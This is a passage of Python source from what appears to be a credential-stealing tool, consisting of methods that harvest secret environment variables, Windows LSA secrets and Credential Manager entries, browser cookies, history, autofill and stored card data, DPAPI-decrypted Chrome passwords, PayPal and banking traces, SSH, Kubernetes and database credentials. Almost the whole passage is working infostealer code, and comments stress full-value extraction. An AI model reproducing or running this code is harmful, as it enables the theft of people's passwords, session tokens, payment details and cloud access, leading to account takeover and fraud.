        """
        credentials = []
        try:
            secret_keywords = [
                'PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API', 'CREDENTIAL',
                'AUTH', 'PRIVATE', 'ENCRYPTED', 'OAUTH', 'APIKEY', 'BEARER',
                'CERT', 'PEM', 'SIGNING', 'ENCRYPTION', 'HMAC', 'JWT', 'SESSION',
                'COOKIE', 'OAUTH2', 'STRIPE', 'GITHUB', 'GITLAB', 'SLACK', 'DISCORD',
                'AWS_ACCESS_KEY', 'AWS_SECRET', 'GCP_KEY', 'AZURE_KEY', 'VAULT', 'PASSWD'
            ]
            
            for key, value in os.environ.items():
                # Check if environment variable name contains secret keyword
                key_upper = key.upper()
                
                if any(keyword in key_upper for keyword in secret_keywords):
                    # Skip obviously non-credential values
                    if len(value) < 2 or value in ['0', '1', 'true', 'false']:
                        continue
                    
                    # Determine credential type
                    cred_type = 'Unknown'
                    if 'API' in key_upper or 'TOKEN' in key_upper:
                        cred_type = 'API Key/Token'
                    elif 'PASSWORD' in key_upper or 'PASSWD' in key_upper:
                        cred_type = 'Password'
                    elif 'AWS' in key_upper:
                        cred_type = 'AWS Credential'
                    elif 'GCP' in key_upper or 'GOOGLE' in key_upper:
                        cred_type = 'GCP Credential'
                    elif 'AZURE' in key_upper:
                        cred_type = 'Azure Credential'
                    elif 'KEY' in key_upper:
                        cred_type = 'Encryption Key'
                    elif 'SECRET' in key_upper:
                        cred_type = 'Secret'
                    elif 'OAUTH' in key_upper or 'AUTH' in key_upper:
                        cred_type = 'OAuth/Auth Token'
                    elif 'CERT' in key_upper or 'PEM' in key_upper:
                        cred_type = 'Certificate'
                    
                    credentials.append({
                        'source': 'Environment Variable',
                        'type': cred_type,
                        'key': key,
                        'value': value,  # Full value extraction (not preview)
                        'value_length': len(value),
                        'severity': 'critical'
                    })
                    
                    self.logger.debug(f"Extracted environment credential: {key} ({cred_type}) = {value[:50]}...")
            
            self.logger.info(f"Environment credential extraction: {len(credentials)} credentials harvested")
        
        except Exception as e:
            self.logger.debug(f"Environment credential extraction failed: {e}")
        
        return credentials

    def _extract_lsa_secrets(self) -> List[dict]:
        """
        Extract LSA Secrets from Windows Registry.
        
        LSA Secrets contains cached credentials:
        - Domain cached logons
        - Service account passwords
        - DPAPI master keys
        - WiFi PSKs
        - RAS credentials
        
        Requires: SYSTEM context (typically post-escalation)
        
        Returns:
            List of dicts with extracted secrets
        """
        secrets = []
        if platform.system() != "Windows":
            return []
        
        try:
            import subprocess
            
            # LSA Secrets are stored in HKLM\Security\Policy\Secrets
            lsa_path = "HKLM\\Security\\Policy\\Secrets"
            
            try:
                # Use reg query to enumerate LSA secrets
                result = subprocess.run(
                    ["reg", "query", lsa_path],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                if result.returncode != 0:
                    self.logger.debug(f"LSA Secrets access denied (requires SYSTEM context)")
                    return []
                
                # Parse registry output - each secret is a subkey
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if not line or line.startswith("HKLM"):
                        continue
                    
                    secret_name = line.split('\\')[-1]
                    secret_path = f"{lsa_path}\\{secret_name}"
                    
                    # Query secret values
                    try:
                        secret_result = subprocess.run(
                            ["reg", "query", secret_path, "/s"],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                        
                        if secret_result.returncode == 0:
                            # Look for CurrentValue, OldValue
                            if "CurrentValue" in secret_result.stdout or "OldValue" in secret_result.stdout:
                                secrets.append({
                                    'source': 'LSA Secrets',
                                    'secret_name': secret_name,
                                    'registry_path': secret_path,
                                    'raw_output': secret_result.stdout,
                                    'severity': 'critical'
                                })
                                self.logger.debug(f"Found LSA secret: {secret_name}")
                    except Exception as e:
                        self.logger.debug(f"Failed to query LSA secret {secret_name}: {e}")
            
            except Exception as e:
                self.logger.debug(f"LSA Secrets enumeration failed: {e}")
            
            self.logger.info(f"LSA Secrets extraction: {len(secrets)} secrets found (requires SYSTEM context)")
        
        except Exception as e:
            self.logger.debug(f"LSA Secrets extraction failed: {e}")
        
        return secrets

    def _extract_credential_manager_vault(self) -> List[dict]:
        r"""
        Extract Windows Credential Manager vault credentials.
        
        Credential Manager stores:
        - Web Credentials (websites, FTP, etc.)
        - Windows Credentials (network shares, RDP, etc.)
        - Certificate Credentials
        
        Storage: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordVault
        Encryption: DPAPI (Data Protection API)
        
        Requires: User context (own credentials) or SYSTEM
        
        Returns:
            List of dicts with extracted credentials
        """
        credentials = []
        if platform.system() != "Windows":
            return []
        
        try:
            import subprocess
            
            # Use cmdkey to list stored credentials
            result = subprocess.run(
                ["cmdkey", "/list"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                current_cred = {}
                
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    
                    if line.startswith("Target:"):
                        if current_cred:
                            credentials.append(current_cred)
                        current_cred = {
                            'source': 'Windows Credential Manager',
                            'target': line.replace("Target:", "").strip(),
                            'severity': 'high'
                        }
                    elif line.startswith("Type:"):
                        current_cred['type'] = line.replace("Type:", "").strip()
                    elif line.startswith("User:"):
                        current_cred['user'] = line.replace("User:", "").strip()
                    elif line.startswith("Password:"):
                        password_field = line.replace("Password:", "").strip()
                        if password_field and password_field != "(null)":
                            current_cred['password'] = password_field
                
                if current_cred:
                    credentials.append(current_cred)
                
                # Try to extract password vault from registry directly
                vault_path = r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\PasswordVault"
                
                try:
                    vault_result = subprocess.run(
                        ["reg", "query", vault_path, "/s"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    
                    if vault_result.returncode == 0:
                        # Parse vault entries
                        for line in vault_result.stdout.split('\n'):
                            if "MsPasswordMgr" in line or "LogonCredential" in line:
                                credentials.append({
                                    'source': 'Credential Manager Vault',
                                    'registry_entry': line.strip(),
                                    'severity': 'critical'
                                })
                except Exception as e:
                    self.logger.debug(f"Credential Manager vault registry query failed: {e}")
            
            self.logger.info(f"Credential Manager extraction: {len(credentials)} credentials found")
        
        except Exception as e:
            self.logger.debug(f"Credential Manager extraction failed: {e}")
        
        return credentials

    def _extract_browser_cookies_history(self) -> List[dict]:
        """
        Extract browser cookies, history, passwords, and autofilled data with enhanced methods.
        
        Extracted data includes:
        - Session cookies (auth tokens, session IDs) with retry logic
        - Persistent cookies (tracking, preferences)
        - History entries (visited URLs, timestamps)
        - Chrome passwords (DPAPI decrypted)
        - Autofill data (credit cards, addresses, etc.)
        - Form data (saved form submissions)
        
        Returns:
            List of dicts with extracted browser data
        """
        import tempfile
        import time
        data = []
        try:
            import sqlite3
            import shutil as shutil_module
            
            system_temp = tempfile.gettempdir()
            
            # Browser profiles with validation
            browsers = {
                'Chrome': os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default") + os.sep,
                'Edge': os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default") + os.sep
            }
            
            # Validate profile paths exist before attempting extraction
            valid_browsers = {}
            for browser_name, profile_path in browsers.items():
                if os.path.isdir(profile_path):
                    valid_browsers[browser_name] = profile_path
                    self.logger.debug(f"✓ {browser_name} profile found: {profile_path}")
                else:
                    self.logger.debug(f"✗ {browser_name} profile not found: {profile_path}")
            
            if not valid_browsers:
                self.logger.warning("No valid browser profiles found")
                return []
            
            browsers = valid_browsers
            
            # ===== ENHANCED COOKIES EXTRACTION WITH RETRY =====
            for browser_name, browser_path_expanded in browsers.items():
                cookie_db = os.path.join(browser_path_expanded, "Cookies")
                
                # Validate cookie database exists
                if not os.path.isfile(cookie_db):
                    self.logger.debug(f"Cookies database not found for {browser_name}: {cookie_db}")
                    continue
                
                extraction_successful = False
                last_error = None
                
                # Retry logic for locked cookies database with exponential delays
                for retry_count in range(3):
                    try:
                        # Use progressively longer delays with exponential backoff
                        if retry_count > 0:
                            delay = min(0.5 * (2 ** (retry_count - 1)), 2.0)  # 0.5s, 1s, 2s
                            self.logger.debug(f"Retry {retry_count}/3 for {browser_name} cookies, waiting {delay}s...")
                            time.sleep(delay)
                        
                        temp_db = os.path.join(system_temp, f"ghost_{browser_name}_cookies_{os.getpid()}_{retry_count}.db")
                        shutil_module.copy2(cookie_db, temp_db)
                        
                        try:
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies LIMIT 200")
                            cookies = cursor.fetchall()
                            
                            if cookies:
                                for host, name, value, expires in cookies:
                                    data.append({
                                        'source': f'{browser_name} Cookie',
                                        'host': host,
                                        'name': name,
                                        'value': value,
                                        'expires': expires,
                                        'type': 'session' if 'session' in name.lower() else 'persistent',
                                        'severity': 'critical' if any(kw in name.lower() for kw in ['session', 'auth', 'token', 'paypal', 'amazon', 'apple']) else 'high'
                                    })
                                
                                extraction_successful = True
                                self.logger.info(f"✓ Extracted {len(cookies)} cookies from {browser_name} on retry {retry_count}")
                                break
                            else:
                                # Try next retry if no cookies found
                                if retry_count < 2:
                                    continue
                            
                            conn.close()
                        finally:
                            if os.path.exists(temp_db):
                                try:
                                    os.remove(temp_db)
                                except:
                                    pass
                    
                    except PermissionError as e:
                        last_error = f"Permission Denied (browser may be running)"
                        if retry_count == 2:
                            self.logger.warning(f"✗ {browser_name} Cookies: {last_error} after 3 retries")
                    except sqlite3.DatabaseError as e:
                        last_error = f"Database Error: {e}"
                        if retry_count == 2:
                            self.logger.warning(f"✗ {browser_name} Cookies: {last_error}")
                    except Exception as e:
                        last_error = f"{type(e).__name__}: {e}"
                        if retry_count == 2:
                            self.logger.warning(f"✗ {browser_name} Cookies extraction failed: {last_error}")
                
                # Fallback methods if direct extraction failed
                if not extraction_successful:
                    self.logger.debug(f"Attempting registry fallback for {browser_name}...")
                    try:
                        cookies_before = len(data)
                        self._extract_cookies_via_registry(browser_name, data)
                        cookies_after = len(data)
                        if cookies_after > cookies_before:
                            self.logger.info(f"✓ Registry fallback: recovered {cookies_after - cookies_before} cookies from {browser_name}")
                            extraction_successful = True
                    except Exception as e:
                        self.logger.debug(f"Registry fallback failed for {browser_name}: {e}")
            
            # ===== CHROME PASSWORD EXTRACTION WITH DPAPI =====
            password_data = self._extract_chrome_passwords()
            data.extend(password_data)
            
            # ===== HISTORY EXTRACTION =====
            for browser_name, browser_path_expanded in browsers.items():
                if not os.path.isdir(browser_path_expanded):
                    continue
                
                history_db = os.path.join(browser_path_expanded, "History")
                if os.path.isfile(history_db):
                    try:
                        temp_db = os.path.join(system_temp, f"ghost_{browser_name}_history_{os.getpid()}.db")
                        shutil_module.copy2(history_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls WHERE visit_count > 1 LIMIT 100")
                        history = cursor.fetchall()
                        
                        for url, title, visits, last_visit in history:
                            data.append({
                                'source': f'{browser_name} History',
                                'url': url,
                                'title': title,
                                'visits': visits,
                                'last_visit': last_visit,
                                'severity': 'high'
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                        self.logger.info(f"Extracted {len(history)} history entries from {browser_name}")
                    
                    except Exception as e:
                        self.logger.warning(f"Failed to extract {browser_name} history: {e}")
                
                # ===== AUTOFILL EXTRACTION WITH CREDIT CARD DETECTION =====
                autofill_db = os.path.join(browser_path_expanded, "Web Data")
                if os.path.isfile(autofill_db):
                    try:
                        temp_db = os.path.join(system_temp, f"ghost_{browser_name}_webdata_{os.getpid()}.db")
                        shutil_module.copy2(autofill_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        # Extract autofill entries
                        cursor.execute("SELECT name, value, count FROM autofill LIMIT 500")
                        autofill = cursor.fetchall()
                        
                        for name, value, count in autofill:
                            field_type = self._identify_autofill_type(name, value)
                            if field_type in ['credit_card', 'address', 'phone', 'email']:
                                data.append({
                                    'source': f'{browser_name} Autofill',
                                    'field_name': name,
                                    'field_value': value,
                                    'use_count': count,
                                    'field_type': field_type,
                                    'severity': 'critical' if field_type == 'credit_card' else 'high'
                                })
                        
                        # Extract stored credit cards
                        try:
                            cursor.execute("SELECT card_number_encrypted, expiration_month, name_on_card FROM credit_cards")
                            cc_entries = cursor.fetchall()
                            for cc_num, exp_month, cardholder in cc_entries:
                                if cc_num and len(str(cc_num)) >= 4:
                                    data.append({
                                        'source': f'{browser_name} Stored Credit Card',
                                        'cardholder': cardholder,
                                        'last_4': str(cc_num)[-4:],
                                        'field_type': 'credit_card_stored',
                                        'severity': 'critical'
                                    })
                        except:
                            pass
                        
                        # Extract saved addresses
                        try:
                            cursor.execute("SELECT company_name, street_address, city, state, postal_code FROM autofill_profiles LIMIT 50")
                            addr_entries = cursor.fetchall()
                            for company, street, city, state, postal in addr_entries:
                                data.append({
                                    'source': f'{browser_name} Saved Address',
                                    'company': company,
                                    'city': city,
                                    'state': state,
                                    'postal_code': postal,
                                    'field_type': 'address',
                                    'severity': 'medium'
                                })
                        except:
                            pass
                        
                        conn.close()
                        os.remove(temp_db)
                        self.logger.info(f"Extracted autofill and payment data from {browser_name}")
                    
                    except Exception as e:
                        self.logger.warning(f"Failed to extract {browser_name} autofill: {e}")
            
            # ===== PAYPAL/BANKING DATA EXTRACTION =====
            paypal_data = self._extract_paypal_banking_data()
            data.extend(paypal_data)
            
            self.logger.info(f"Browser data extraction: {len(data)} entries (cookies, history, passwords, autofill)")
        
        except Exception as e:
            self.logger.warning(f"Browser data extraction failed: {e}")
        
        return data
    
    def _extract_chrome_passwords(self) -> List[dict]:
        """Extract Chrome passwords with DPAPI decryption"""
        credentials = []
        try:
            import sqlite3
            import shutil as shutil_module
            import tempfile
            
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\")
            db_path = os.path.join(chrome_path, "Login Data")
            
            if not os.path.isfile(db_path):
                return []
            
            temp_db = os.path.join(tempfile.gettempdir(), f"chrome_pwd_{os.getpid()}.db")
            
            try:
                shutil_module.copy2(db_path, temp_db)
            except PermissionError:
                self.logger.warning("Chrome database locked - browser may be running")
                return []
            
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT signon_realm, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                
                for origin, username, encrypted_password in rows:
                    decrypted_password = None
                    
                    # Try DPAPI decryption
                    try:
                        payload = ctypes.create_string_buffer(encrypted_password)
                        
                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", wintypes.DWORD),
                                       ("pbData", ctypes.POINTER(wintypes.BYTE))]
                        
                        input_blob = DATA_BLOB()
                        input_blob.pbData = ctypes.cast(payload, ctypes.POINTER(wintypes.BYTE))
                        input_blob.cbData = len(encrypted_password)
                        output_blob = DATA_BLOB()
                        
                        kernel32 = ctypes.windll.kernel32
                        ret = kernel32.CryptUnprotectData(
                            ctypes.byref(input_blob), None, None, None, 0,
                            ctypes.byref(output_blob)
                        )
                        
                        if ret:
                            decrypted_bytes = ctypes.string_at(output_blob.pbData, output_blob.cbData)
                            decrypted_password = decrypted_bytes.decode('utf-8', errors='ignore')
                    except Exception as dpapi_error:
                        self.logger.debug(f"DPAPI decryption failed: {dpapi_error}")
                    
                    credentials.append({
                        'source': 'Chrome Password Manager',
                        'origin': origin,
                        'username': username,
                        'password': decrypted_password if decrypted_password else '(ENCRYPTED)',
                        'strength': self._estimate_password_strength(decrypted_password) if decrypted_password else 'unknown',
                        'severity': 'critical'
                    })
                
                conn.close()
                self.logger.info(f"Chrome passwords: {len(credentials)} extracted")
            
            except Exception as e:
                self.logger.warning(f"Chrome password query failed: {e}")
            
            finally:
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except:
                        pass
        
        except Exception as e:
            self.logger.warning(f"Chrome password extraction failed: {e}")
        
        return credentials
    
    def _extract_paypal_banking_data(self) -> List[dict]:
        """Extract PayPal and financial data from browser storage with deduplication"""
        data = []
        seen_records = set()  # Track seen PayPal records to avoid duplicates
        
        try:
            browsers_to_check = {
                'Chrome': os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"),
                'Edge': os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\")
            }
            
            paypal_keywords = ['paypal', 'stripe', 'square', 'banking', 'payment']
            
            for browser_name, browser_path in browsers_to_check.items():
                if not os.path.isdir(browser_path):
                    self.logger.debug(f"{browser_name} profile not found: {browser_path}")
                    continue
                
                # Check Local Storage for PayPal data
                local_storage_path = os.path.join(browser_path, "Local Storage\\leveldb")
                if os.path.isdir(local_storage_path):
                    try:
                        for file in os.listdir(local_storage_path):
                            if file.endswith(('.ldb', '.log')):
                                filepath = os.path.join(local_storage_path, file)
                                try:
                                    with open(filepath, 'rb') as f:
                                        content = f.read()
                                        for keyword in paypal_keywords:
                                            if keyword.encode() in content:
                                                # Create unique record identifier
                                                record_id = f"{browser_name}_leveldb_{keyword}_{file}"
                                                
                                                # Only add if not already seen
                                                if record_id not in seen_records:
                                                    seen_records.add(record_id)
                                                    data.append({
                                                        'source': f'{browser_name} Local Storage',
                                                        'site_type': keyword.title(),
                                                        'file': file,
                                                        'storage_type': 'LevelDB',
                                                        'severity': 'high'
                                                    })
                                                    self.logger.debug(f"✓ Found {keyword} data in {browser_name} Local Storage")
                                except:
                                    pass
                    except Exception as e:
                        self.logger.debug(f"Local Storage scan failed for {browser_name}: {e}")
                
                # Check IndexedDB for PayPal stored data
                indexed_db_path = os.path.join(browser_path, "IndexedDB")
                if os.path.isdir(indexed_db_path):
                    try:
                        for root, dirs, files in os.walk(indexed_db_path):
                            for file in files:
                                file_lower = file.lower()
                                for keyword in paypal_keywords:
                                    if keyword in file_lower:
                                        # Create unique record identifier
                                        record_id = f"{browser_name}_indexeddb_{keyword}_{os.path.basename(file)}"
                                        
                                        # Only add if not already seen
                                        if record_id not in seen_records:
                                            seen_records.add(record_id)
                                            data.append({
                                                'source': f'{browser_name} IndexedDB',
                                                'site_type': keyword.title(),
                                                'file': file,
                                                'storage_type': 'IndexedDB',
                                                'severity': 'high'
                                            })
                                            self.logger.debug(f"✓ Found {keyword} data in {browser_name} IndexedDB")
                    except Exception as e:
                        self.logger.debug(f"IndexedDB scan failed for {browser_name}: {e}")
        
        except Exception as e:
            self.logger.warning(f"PayPal extraction failed: {e}")
        
        self.logger.info(f"PayPal/Banking extraction: {len(data)} unique records found (deduped from {len(seen_records)} scanned items)")
        return data
    
    def _identify_autofill_type(self, field_name: str, field_value: str) -> str:
        """Identify the type of autofill data"""
        field_lower = field_name.lower() if field_name else ""
        value_lower = field_value.lower() if field_value else ""
        
        if any(kw in field_lower for kw in ['card', 'cardnumber', 'cc_number']):
            return 'credit_card'
        if field_value and len(str(field_value).replace(' ', '')) in [13, 14, 15, 16, 19]:
            if str(field_value)[0] in '456':
                return 'credit_card'
        if any(kw in field_lower for kw in ['address', 'street', 'zip', 'postal', 'city', 'state']):
            return 'address'
        if any(kw in field_lower for kw in ['phone', 'tel', 'mobile']):
            return 'phone'
        if any(kw in field_lower for kw in ['email', 'mail']):
            if '@' in field_value:
                return 'email'
        
        return 'generic'
    
    def _extract_cookies_via_registry(self, browser_name: str, data: List) -> None:
        """Fallback: Extract cookies from Windows Registry"""
        if platform.system() != "Windows":
            return
        
        try:
            import winreg
            registry_paths = {
                'Chrome': r"Software\Google\Chrome\BLBeacon",
                'Edge': r"Software\Microsoft\Edge"
            }
            
            if browser_name not in registry_paths:
                return
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_paths[browser_name]) as reg:
                for i in range(winreg.QueryInfoKey(reg)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(reg, i)
                        if any(kw in str(value).lower() for kw in ['cookie', 'session', 'auth']):
                            data.append({
                                'source': f'{browser_name} Registry',
                                'name': name,
                                'severity': 'medium'
                            })
                    except:
                        pass
        except Exception as e:
            self.logger.debug(f"Registry extraction failed: {e}")

    def _estimate_password_strength(self, password: str) -> str:
        """Estimate password strength for reporting"""
        score = 0
        if len(password) >= 12:
            score += 1
        if any(c.isupper() for c in password):
            score += 1
        if any(c.islower() for c in password):
            score += 1
        if any(c.isdigit() for c in password):
            score += 1
        if any(c in "!@#$%^&*" for c in password):
            score += 1
        
        if score <= 2:
            return "weak"
        elif score <= 3:
            return "moderate"
        else:
            return "strong"

    def _scan_browser_data(self) -> List[dict]:
        """Scan browser for stored credentials, history, and cookies"""
        data = []
        try:
            browsers = {
                'Chrome': os.path.expanduser("~/.config/google-chrome/Default/"),
                'Firefox': os.path.expanduser("~/.mozilla/firefox/"),
                'Edge': os.path.expanduser("~/.config/microsoft-edge/Default/") if platform.system() != "Windows" 
                        else os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\"),
            }
            
            if platform.system() == "Windows":
                browsers['Chrome'] = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\")
                browsers['Edge'] = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\")
            
            for browser_name, browser_path in browsers.items():
                if not os.path.isdir(browser_path):
                    continue
                
                # Check for common sensitive files
                for filename in ['History', 'Cookies', 'Login Data', 'Bookmarks', 'autofill']:
                    filepath = os.path.join(browser_path, filename)
                    if os.path.isfile(filepath):
                        data.append({
                            'source': f'{browser_name} Browser',
                            'file_type': filename,
                            'path': filepath,
                            'severity': 'high' if 'Login' in filename or 'Cookies' in filename else 'medium'
                        })
            
            self.logger.info(f"Browser data: {len(data)} locations found")
            
        except Exception as e:
            self.logger.debug(f"Browser data scan failed: {e}")
        
        return data

    def _scan_environment_secrets(self) -> List[dict]:
        """Scan environment variables for potentially sensitive data"""
        secrets = []
        try:
            secret_keywords = [
                'PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API', 'CREDENTIAL',
                'AUTH', 'PRIVATE', 'ENCRYPTED', 'OAUTH', 'APIKEY'
            ]
            
            for key, value in os.environ.items():
                if any(keyword in key.upper() for keyword in secret_keywords):
                    # Mask the actual value for safety
                    masked = value[:10] + '***' if len(value) > 10 else '***'
                    secrets.append({
                        'source': 'Environment Variable',
                        'key': key,
                        'value_preview': masked,
                        'severity': 'high'
                    })
            
            self.logger.info(f"Environment secrets: {len(secrets)} variables found")
            
        except Exception as e:
            self.logger.debug(f"Environment secrets scan failed: {e}")
        
        return secrets

    def _scan_file_secrets(self) -> List[dict]:
        """Scan common file locations for hardcoded secrets"""
        secrets = []
        try:
            # Common file patterns containing secrets
            secret_file_patterns = [
                '.env', '.env.local', '.env.*.local', '*.pem', '*.key', '*.pass',
                '*secret*', '*password*', '*credential*', '.bashrc', '.bash_history'
            ]
            
            home_dir = os.path.expanduser("~")
            
            # Scan home directory (limited depth to avoid slow scans)
            for root, dirs, files in os.walk(home_dir):
                # Skip hidden directories and common large directories
                dirs[:] = [d for d in dirs if not d.startswith('.') or d in ['.ssh', '.config', '.aws']]
                
                for filename in files:
                    filepath = os.path.join(root, filename)
                    
                    # Check against patterns
                    import fnmatch
                    if any(fnmatch.fnmatch(filename, pattern) for pattern in secret_file_patterns):
                        try:
                            # Try to read file (limit size to 1MB)
                            if os.path.getsize(filepath) < 1024 * 1024:
                                with open(filepath, 'r', errors='ignore') as f:
                                    content = f.read(500)  # Read first 500 chars
                                    if any(kw in content.lower() for kw in ['password', 'secret', 'api', 'token']):
                                        secrets.append({
                                            'source': 'File Secret',
                                            'file': filepath,
                                            'filename': filename,
                                            'severity': 'high'
                                        })
                        except Exception:
                            pass
                
                # Limit depth
                if root.count(os.sep) - home_dir.count(os.sep) > 2:
                    break
            
            self.logger.info(f"File-based secrets: {len(secrets)} files found")
            
        except Exception as e:
            self.logger.debug(f"File secrets scan failed: {e}")
        
        return secrets

    def _detect_encrypted_files(self) -> List[dict]:
        """Detect encrypted files and encryption tools"""
        encrypted = []
        try:
            # Encryption signatures and patterns
            encryption_indicators = {
                'BitLocker': ['.bitlocker', 'Encrypted: Yes'],
                'VeraCrypt': ['TrueCrypt', 'VeraCrypt'],
                'LUKS': ['LUKS', 'pvcreate', 'lvcreate'],
                'OpenSSL': [b'-----BEGIN ENCRYPTED'],
                'GPG': ['.gpg', '.pgp'],
                '7Zip Encrypted': ['.7z'],
            }
            
            # Scan for encrypted files
            home_dir = os.path.expanduser("~")
            common_extensions = ['.enc', '.encrypted', '.gpg', '.pgp', '.7z', '.rar']
            
            for root, dirs, files in os.walk(home_dir):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                
                for filename in files:
                    filepath = os.path.join(root, filename)
                    
                    # Check by extension
                    if any(filename.endswith(ext) for ext in common_extensions):
                        encrypted.append({
                            'source': 'Encrypted File',
                            'file': filepath,
                            'type': 'By Extension',
                            'severity': 'medium'
                        })
                    
                    # Check file magic bytes
                    try:
                        with open(filepath, 'rb') as f:
                            header = f.read(20)
                            # GPG header
                            if header[:3] == b'\x84\x03\x00':
                                encrypted.append({
                                    'source': 'GPG Encrypted',
                                    'file': filepath,
                                    'type': 'GPG',
                                    'severity': 'medium'
                                })
                            # 7Zip header
                            elif header[:6] == b'7z\xBC\xAF\x27\x1C':
                                encrypted.append({
                                    'source': 'Encrypted Archive',
                                    'file': filepath,
                                    'type': '7Zip',
                                    'severity': 'medium'
                                })
                    except Exception:
                        pass
                
                # Limit depth
                if root.count(os.sep) - home_dir.count(os.sep) > 2:
                    break
            
            # Check for encryption tools/volumes
            if platform.system() == "Windows":
                # BitLocker check
                try:
                    import subprocess
                    result = subprocess.run(['manage-bde', '-status'], capture_output=True, text=True, timeout=5)
                    if 'Protection Status: Protection On' in result.stdout:
                        encrypted.append({
                            'source': 'BitLocker',
                            'type': 'Full Disk Encryption',
                            'severity': 'medium'
                        })
                except Exception:
                    pass
            
            self.logger.info(f"Encrypted files: {len(encrypted)} items detected")
            
        except Exception as e:
            self.logger.debug(f"Encryption detection failed: {e}")
        
        return encrypted

    def _extract_kubernetes_credentials(self) -> List[dict]:
        """Extract Kubernetes cluster credentials and tokens."""
        credentials = []
        try:
            k8s_paths = [
                os.path.expanduser("~/.kube/config"),
                os.path.expanduser("~/.kube/clusters"),
                os.path.expanduser("~/.minikube/machines"),
                "/etc/kubernetes/",
                "/var/run/secrets/kubernetes.io/serviceaccount/"
            ]
            
            for k8s_path in k8s_paths:
                if not os.path.exists(k8s_path):
                    continue
                
                if os.path.isfile(k8s_path):
                    try:
                        with open(k8s_path, 'r') as f:
                            content = f.read()
                            if 'certificate-authority-data' in content or 'apiVersion' in content:
                                credentials.append({
                                    'source': 'Kubernetes Config',
                                    'file': k8s_path,
                                    'contains_certs': 'certificate-authority' in content,
                                    'contains_tokens': 'token:' in content,
                                    'severity': 'critical'
                                })
                    except Exception as e:
                        self.logger.debug(f"Kubernetes config read failed: {e}")
                
                elif os.path.isdir(k8s_path):
                    try:
                        for root, dirs, files in os.walk(k8s_path):
                            for fname in files:
                                if fname.endswith(('.crt', '.key', '.pem', '.yaml', '.yml', 'config')):
                                    credentials.append({
                                        'source': 'Kubernetes Artifact',
                                        'file': os.path.join(root, fname),
                                        'type': fname.split('.')[-1] if '.' in fname else 'unknown',
                                        'severity': 'critical'
                                    })
                            # Limit depth
                            if root.count(os.sep) - k8s_path.count(os.sep) > 2:
                                break
                    except Exception as e:
                        self.logger.debug(f"Kubernetes directory scan failed: {e}")
            
            self.logger.info(f"Kubernetes credentials: {len(credentials)} artifacts found")
        except Exception as e:
            self.logger.debug(f"Kubernetes extraction failed: {e}")
        
        return credentials

    def _extract_database_credentials(self) -> List[dict]:
        """Extract database connection strings and credentials."""
        credentials = []
        try:
            # Common database config file patterns
            db_patterns = [
                os.path.expanduser("~/.mysql/config"),
                os.path.expanduser("~/.my.cnf"),
                os.path.expanduser("~/.pgpass"),
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.mongodb/mongod.conf"),
                os.path.expanduser("~/.config/mysql/config"),
            ]
            
            # Search for DB-related environment variables
            for key, value in os.environ.items():
                key_upper = key.upper()
                if any(db_kw in key_upper for db_kw in ['DATABASE', 'DB_', 'POSTGRES', 'MYSQL', 'MONGO', 'REDIS', 'CASSANDRA']):
                    if len(value) > 5:
                        credentials.append({
                            'source': 'Database ENV',
                            'variable': key,
                            'contains_connection_string': any(proto in value.lower() for proto in ['://','@']),
                            'severity': 'critical' if '://' in value or '@' in value else 'high'
                        })
            
            # Check common database config files
            for db_file in db_patterns:
                if os.path.isfile(db_file):
                    try:
                        with open(db_file, 'r') as f:
                            content = f.read(1000)
                            if any(kw in content.lower() for kw in ['password', 'user', 'host', 'port', 'database']):
                                credentials.append({
                                    'source': 'Database Config',
                                    'file': db_file,
                                    'severity': 'critical'
                                })
                    except Exception as e:
                        self.logger.debug(f"Database config read failed: {e}")
            
            # Search home directory for database files
            home_dir = os.path.expanduser("~")
            for root, dirs, files in os.walk(home_dir):
                dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ['node_modules', '__pycache__', '.git']]
                
                for fname in files:
                    if fname in ['database.yml', 'database.json', 'db.json', 'config.ini', 'settings.py']:
                        filepath = os.path.join(root, fname)
                        try:
                            with open(filepath, 'r') as f:
                                content = f.read(1000)
                                if any(kw in content.lower() for kw in ['password', 'user', 'host', 'port', 'database', 'connection']):
                                    credentials.append({
                                        'source': 'Database Config File',
                                        'file': filepath,
                                        'severity': 'high'
                                    })
                        except Exception:
                            pass
                
                # Limit depth
                if root.count(os.sep) - home_dir.count(os.sep) > 3:
                    break
            
            self.logger.info(f"Database credentials: {len(credentials)} configs found")
        except Exception as e:
            self.logger.debug(f"Database extraction failed: {e}")
        
        return credentials

    def _extract_ssh_keys_advanced(self) -> List[dict]:
        """Advanced SSH key extraction with passphrase detection."""
        keys = []
        try:
